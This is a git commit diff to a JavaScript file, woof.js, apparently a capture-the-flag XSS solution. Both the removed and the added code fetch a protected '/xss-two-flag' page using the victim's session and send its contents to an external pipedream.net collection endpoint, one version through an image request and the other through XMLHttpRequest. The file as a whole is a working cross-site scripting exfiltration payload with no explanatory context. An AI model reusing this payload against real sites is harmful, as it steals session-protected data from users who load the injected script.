d7fe062abec016b4e7f7c75317e757e9965e728c
João Pedro Duarte <jurbasgames@gmail.com>
2024-05-05 21:07:58 -0300

    Update woof.js

--- woof.js
+++ woof.js
@@ -1,18 +1,7 @@
-document.addEventListener('DOMContentLoaded', () => {
-    // Supõe que a flag esteja acessível pela URL /xss-two-flag
-    fetch('/xss-two-flag', {
-        credentials: 'include' // Assegura que cookies e sessões sejam enviados com a requisição
-    })
-    .then(response => response.text()) // Converte a resposta para texto
-    .then(flag => {
-        // Envio da flag para o servidor externo
-        const url = 'https://eom6hzyuukgbktj.m.pipedream.net/';
-        const params = new URLSearchParams({ flag: flag });
-
-        // Cria uma imagem para enviar a requisição GET
-        var img = new Image();
-        img.src = `${url}?${params.toString()}`;
-        document.body.appendChild(img); // Adiciona a imagem ao corpo do documento para disparar a requisição
-    })
-    .catch(error => console.error('Error fetching the flag:', error));
-});
+var xhr = new XMLHttpRequest();
+xhr.open('GET',location.origin + '/xss-two-flag',true);
+xhr.onload = function () {
+var request = new XMLHttpRequest();
+request.open('GET','https://eom6hzyuukgbktj.m.pipedream.net/?flag=' + xhr.responseText,true);
+request.send()};
+xhr.send(null);
